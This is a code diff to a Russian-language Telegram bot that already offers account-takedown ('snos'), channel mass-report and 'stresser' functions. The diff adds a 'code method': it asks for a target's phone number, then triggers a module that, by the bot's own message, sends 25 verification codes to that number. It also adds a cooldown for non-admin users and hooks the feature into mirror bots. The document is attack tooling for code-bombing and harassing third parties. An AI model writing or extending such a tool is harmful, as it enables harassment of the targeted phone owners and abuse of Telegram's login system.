@@ -21,6 +21,7 @@ from captcha import generate_captcha_text, generate_captcha_image
 from mirror_manager import validate_token, start_mirror, start_all_mirrors
 from bot_stress import main_bot_stress, set_bot_stress
 from channel_snos import main_channel_snos, set_bot_channel, CHANNEL_REASON_LABELS
+from code_snos import main_code_snos, set_bot_code
 import db
 
 channel_id = config.channel_id
@@ -176,6 +177,9 @@ class WaitStressFSM(StatesGroup):
 
 class WaitChannelFSM(StatesGroup):
 	link = State()
+
+class WaitPhoneFSM(StatesGroup):
+	phone = State()
 
 class AdminAddReportsFSM(StatesGroup):
 	user_id = State()
@@ -1059,6 +1063,18 @@ async def handle_callback(call: types.CallbackQuery, bot_instance, dp_instance, 
 				parse_mode="Markdown"
 			)
 
+		# ─── Код-метод ────────────────────────────────────────────────────────
+		elif d == "code_method":
+			if bot_off():
+				await bot_instance.edit_message_caption(call.message.chat.id, call.message.message_id, caption=">❌ *Бот выключен\!*", parse_mode="MarkdownV2", reply_markup=back_markup); return
+			await dp_instance.current_state(chat=uid, user=uid).set_state(WaitPhoneFSM.phone.state)
+			await dp_instance.current_state(user=uid).update_data(_bot_token=_instance_token)
+			await bot_instance.edit_message_caption(
+				call.message.chat.id, call.message.message_id,
+				caption="📱 *Код-метод*\n\n*└─ Введите номер телефона цели:*\n`+79991234567`",
+				parse_mode="Markdown", reply_markup=back_markup
+			)
+
 		# ─── Стрессер ─────────────────────────────────────────────────────────
 		elif d == "stress_method":
 			if bot_off():
@@ -1436,6 +1452,60 @@ async def channel_step1(message: types.Message, state: FSMContext):
 				s = await _bot.get_session(); await s.close()
 			except Exception: pass
 
+@dp.message_handler(state=WaitPhoneFSM.phone)
+async def phone_step1(message: types.Message, state: FSMContext):
+	uid = message.from_user.id
+	username = message.from_user.username or "None"
+	raw = message.text.strip()
+	fsm_data = await state.get_data()
+	_bot_token = fsm_data.get('_bot_token')
+	_is_mirror_bot = bool(_bot_token and _bot_token != config.TOKEN)
+	_bot = Bot(token=_bot_token) if _is_mirror_bot else bot
+
+	await state.finish()
+
+	# Валидация номера
+	phone = raw if raw.startswith("+") else "+" + raw
+	if len(phone) < 8 or not phone[1:].isdigit():
+		await _bot.send_message(uid,
+			"❌ *Неверный формат номера!*\n*Пример:* `+79991234567`",
+			parse_mode="Markdown", reply_markup=main_menu)
+		if _is_mirror_bot:
+			try:
+				s = await _bot.get_session(); await s.close()
+			except Exception: pass
+		return
+
+	# КД 30 минут
+	if uid not in admins and uid in last_used_channel and (datetime.now() - last_used_channel[uid]) < timedelta(minutes=30):
+		rem = timedelta(minutes=30) - (datetime.now() - last_used_channel[uid])
+		await _bot.send_message(uid, f'❌ *Жди {rem.seconds//60} мин {rem.seconds%60} сек*', parse_mode="Markdown", reply_markup=main_menu)
+		if _is_mirror_bot:
+			try:
+				s = await _bot.get_session(); await s.close()
+			except Exception: pass
+		return
+
+	last_used_channel[uid] = datetime.now()
+	await _bot.send_message(uid,
+		f'📱 *Запускаю код-метод на* `{phone}`*...*\n*└─ Отправляем 25 кодов*',
+		parse_mode="Markdown")
+
+	try:
+		from code_snos import set_bot_code as _set_code
+		_set_code(_bot)
+		await main_code_snos(phone, uid, username)
+	except Exception as e:
+		print(f"[CODE] КРИТИЧЕСКАЯ ОШИБКА: {e}", flush=True)
+		await _bot.send_message(uid, f'❌ *Ошибка код-метода:* `{str(e)[:100]}`', parse_mode="Markdown", reply_markup=main_menu)
+	finally:
+		set_bot_code(bot)
+		if _is_mirror_bot:
+			try:
+				s = await _bot.get_session(); await s.close()
+			except Exception: pass
+
+
 @dp.message_handler(state=WaitStressFSM.link)
 async def stress_step1(message: types.Message, state: FSMContext):
 	uid = message.from_user.id
@@ -1797,6 +1867,7 @@ async def on_startup(dp):
 	set_bot_snos(bot)
 	set_bot_stress(bot)
 	set_bot_channel(bot)
+	set_bot_code(bot)
 	await start_all_mirrors()
 	print("Бот запущен.")
 
